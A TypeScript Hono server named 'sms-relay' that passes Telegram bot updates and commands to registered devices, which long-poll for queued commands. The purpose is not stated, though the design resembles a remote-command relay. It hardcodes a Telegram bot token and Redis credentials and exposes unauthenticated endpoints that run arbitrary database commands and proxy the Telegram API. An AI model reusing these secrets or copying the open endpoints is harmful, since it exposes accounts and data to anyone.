import { Hono } from 'hono';
import { serve } from '@hono/node-server';
import { Redis } from '@upstash/redis';

// ═══════════════════════════════════════════════════
// Config
// ═══════════════════════════════════════════════════
const BOT_TOKEN = process.env.BOT_TOKEN || '968381153:AAHvuGQisktBbZTHM7O6J136Ysfmdl6t-uk';
const CHAT_ID = process.env.CHAT_ID || '520092586';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL || 'https://relaxed-redbird-225903.upstash.io',
  token: process.env.UPSTASH_REDIS_REST_TOKEN || 'gQAAAAAAA3JvAAIgcDFiYWFlYmNlZmY0ZWI0ZWZmYjE2ZTQ0ZDNiM2JmODllYg',
});

const app = new Hono().basePath('/api');

// ═══════════════════════════════════════════════════
// Device Management
// ═══════════════════════════════════════════════════

app.get('/register', async (c) => {
  try {
    const id = c.req.query('id');
    const name = c.req.query('name') || 'Unknown';
    if (!id) return c.json({ ok: false, error: 'no id' }, 400);

    await redis.set(`device:${id}`, JSON.stringify({ id, name, last_seen: Date.now() }), { ex: 600 });

    let active = await redis.get('active');
    if (!active) {
      await redis.set('active', id, { ex: 120 });
      active = id;
    }
    await flushGeneralQueue(id);
    return c.json({ ok: true, active });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

app.post('/register', async (c) => {
  try {
    const { id, name } = await c.req.json();
    if (!id) return c.json({ ok: false, error: 'no id' }, 400);

    await redis.set(`device:${id}`, JSON.stringify({ id, name: name || 'Unknown', last_seen: Date.now() }), { ex: 600 });

    // اگر هیچ active نیست، این دستگاه active شود
    let active = await redis.get('active');
    if (!active) {
      await redis.set('active', id, { ex: 120 });
      active = id;
      console.log(`🏆 ${id} became active (first)`);
    }

    // Flush any pending general queue
    await flushGeneralQueue(id);

    return c.json({ ok: true, active });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

app.get('/heartbeat', async (c) => {
  try {
    const id = c.req.query('id');
    if (!id) return c.json({ ok: false, error: 'no id' }, 400);

    const device = await redis.get(`device:${id}`);
    if (!device) return c.json({ ok: false, error: 'not registered' });

    const d = typeof device === 'string' ? JSON.parse(device) : device;
    d.last_seen = Date.now();
    await redis.set(`device:${id}`, JSON.stringify(d), { ex: 600 });

    let active = await redis.get('active');
    if (active === id) {
      // تمدید
      await redis.set('active', id, { ex: 120 });
    } else if (!active) {
      // هیچ active نیست → این دستگاه active شود
      await redis.set('active', id, { ex: 120 });
      active = id;
      console.log(`🏆 ${id} became active (heartbeat)`);
      await flushGeneralQueue(id);
    }

    return c.json({ ok: true, active: active || null, isActive: active === id });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

app.get('/devices', async (c) => {
  try {
    const keys = await redis.keys('device:*');
    const active = await redis.get('active');
    const now = Date.now();
    const devices: any[] = [];

    for (const k of keys) {
      const v = await redis.get(k);
      if (!v) continue;
      const d = typeof v === 'string' ? JSON.parse(v) : v;
      d.active = d.id === active;
      d.online = now - d.last_seen < 180_000;
      devices.push(d);
    }

    devices.sort((a, b) => b.last_seen - a.last_seen);
    return c.json({ ok: true, devices, active: active || null });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

app.get('/active', async (c) => {
  try {
    const active = await redis.get('active');
    return c.json({ ok: true, active: active || null });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

app.post('/set-active', async (c) => {
  try {
    const { id } = await c.req.json();
    if (!id) return c.json({ ok: false, error: 'no id' }, 400);

    await redis.set('active', id, { ex: 120 });
    // پاک کردن صف قدیمی
    const keys = await redis.keys('queue:*');
    for (const k of keys) await redis.del(k);

    console.log(`🔄 Active changed to ${id}`);
    return c.json({ ok: true, active: id });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

// ═══════════════════════════════════════════════════
// Long-poll for commands
// ═══════════════════════════════════════════════════

app.get('/poll', async (c) => {
  try {
    const deviceId = c.req.query('id');
    if (!deviceId) return c.json({ ok: false, error: 'no id' }, 400);

    const deadline = Date.now() + 25_000;
    let active = await redis.get('active');

    while (Date.now() < deadline) {
      // جمع کردن آیتم‌های صف (اگر خودم active هستم)
      if (active === deviceId) {
        const items: any[] = [];
        // حداکثر ۱۰ آیتم در هر poll
        for (let i = 0; i < 10; i++) {
          const item = await redis.lpop(`queue:${deviceId}`);
          if (!item) break;
          items.push(typeof item === 'string' ? JSON.parse(item) : item);
        }
        if (items.length > 0) {
          return c.json({ ok: true, active: true, updates: items });
        }
      }

      // refresh active
      active = await redis.get('active');
      await new Promise(r => setTimeout(r, 500));
    }

    return c.json({ ok: true, active: active === deviceId, updates: [] });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

// ═══════════════════════════════════════════════════
// Send message via bot
// ═══════════════════════════════════════════════════

app.post('/send', async (c) => {
  try {
    const body = await c.req.json();
    const payload: any = {
      chat_id: CHAT_ID,
      text: body.text,
      parse_mode: body.parse_mode || 'HTML',
    };
    if (body.reply_markup) payload.reply_markup = body.reply_markup;
    if (body.disable_web_page_preview !== undefined) payload.disable_web_page_preview = body.disable_web_page_preview;

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await r.json();
    return c.json(data);
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

app.post('/answerCallback', async (c) => {
  try {
    const { id, text } = await c.req.json();
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: id, text: text || '' }),
    });
    return c.json(await r.json());
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

// ═══════════════════════════════════════════════════
// Raw Upstash proxy (برای سازگاری)
// ═══════════════════════════════════════════════════

app.all('/upstash', async (c) => {
  try {
    const cmd = (c.req.query('cmd') || '').toUpperCase();
    const key = c.req.query('key') || '';
    const value = c.req.query('value') || '';
    const nx = c.req.query('nx') === 'true';
    const exStr = c.req.query('ex');
    const ex = exStr ? parseInt(exStr) : undefined;

    if (!cmd || !key) return c.json({ error: 'cmd and key required' }, 400);

    switch (cmd) {
      case 'GET': {
        const v = await redis.get(key);
        return c.json({ result: v === undefined ? null : v });
      }
      case 'SET': {
        if (!value) return c.json({ error: 'value required' }, 400);
        const opts: any = {};
        if (nx) opts.nx = true;
        if (ex) opts.ex = ex;
        const r = await redis.set(key, value, opts);
        return c.json({ result: r });
      }
      case 'DEL': {
        const n = await redis.del(key);
        return c.json({ result: n });
      }
      case 'LPUSH': {
        const n = await redis.lpush(key, value);
        return c.json({ result: n });
      }
      case 'RPOP': {
        const v = await redis.rpop(key);
        return c.json({ result: v });
      }
      case 'KEYS': {
        const k = await redis.keys(key);
        return c.json({ result: k });
      }
      default:
        return c.json({ error: 'unsupported cmd' }, 400);
    }
  } catch (e: any) {
    return c.json({ error: e.message }, 500);
  }
});

app.all('/proxy', async (c) => {
  try {
    const path = c.req.query('path') || '';
    if (!path) return c.json({ ok: false, error: 'missing path' }, 400);
    const url = new URL(c.req.url);
    const params = new URLSearchParams(url.search);
    params.delete('path');
    const q = params.toString();
    const targetUrl = `https://api.telegram.org/${path}${q ? '?' + q : ''}`;
    let bodyBuf: ArrayBuffer | undefined;
    if (!['GET', 'HEAD'].includes(c.req.method)) {
      bodyBuf = await c.req.arrayBuffer();
    }
    const resp = await fetch(targetUrl, {
      method: c.req.method,
      headers: { 'Content-Type': c.req.header('content-type') || 'application/json' },
      body: bodyBuf,
    });
    const data = await resp.arrayBuffer();
    return new Response(data, {
      status: resp.status,
      headers: { 'Content-Type': resp.headers.get('content-type') || 'application/json' },
    });
  } catch (e: any) {
    return c.json({ ok: false, error: e.message }, 500);
  }
});

// ═══════════════════════════════════════════════════
// Background Telegram poller
// ═══════════════════════════════════════════════════

const OFFSET_KEY = 'telegram_offset';

async function flushGeneralQueue(deviceId: string) {
  try {
    const items: any[] = [];
    for (let i = 0; i < 20; i++) {
      const item = await redis.lpop(`queue:_general`);
      if (!item) break;
      items.push(typeof item === 'string' ? JSON.parse(item) : item);
    }
    for (const it of items) {
      await redis.rpush(`queue:${deviceId}`, JSON.stringify(it));
    }
  } catch (e) { }
}

async function pollTelegram() {
  try {
    const offsetRaw = await redis.get(OFFSET_KEY);
    const offset = offsetRaw ? parseInt(String(offsetRaw)) : 0;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=2&allowed_updates=["message","callback_query"]`;
    const r = await fetch(url);
    const data: any = await r.json();
    if (!data.ok) {
      console.error('pollTelegram: not ok', data.description);
      return;
    }
    const updates = data.result || [];
    if (updates.length === 0) return;

    let maxId = offset - 1;
    const active = await redis.get('active');

    for (const u of updates) {
      if (u.update_id > maxId) maxId = u.update_id;

      const cbData = u.callback_query?.data || '';

      // ─── dev:set:X → تغییر active
      if (cbData.startsWith('dev:set:')) {
        const targetId = cbData.substring(7);
        await redis.set('active', targetId, { ex: 120 });
        console.log(`🎯 dev:set → ${targetId}`);
        // این callback را به صف دستگاه هدف بفرست
        await redis.rpush(`queue:${targetId}`, JSON.stringify(u));
        continue;
      }

      // ─── بقیه: به active فعلی
      if (active) {
        await redis.rpush(`queue:${active}`, JSON.stringify(u));
      } else {
        // هیچ active نیست → نگه دار در صف عمومی
        await redis.rpush(`queue:_general`, JSON.stringify(u));
      }
    }

    await redis.set(OFFSET_KEY, maxId);
  } catch (e: any) {
    console.error('pollTelegram:', e.message);
  }
}

// شروع polling (Render یک process دائمی است)
setInterval(pollTelegram, 2000);
pollTelegram();

// ═══════════════════════════════════════════════════
// Health & Start
// ═══════════════════════════════════════════════════

app.get('/', (c) => c.json({
  ok: true,
  service: 'sms-relay',
  version: '3.0.0',
}));

const port = parseInt(process.env.PORT || '10000');
serve({ fetch: app.fetch, port }, () => {
  console.log(`🚀 Server on port ${port}`);
  console.log(`📱 Bot token: ${BOT_TOKEN.substring(0, 20)}...`);
});

export default app;
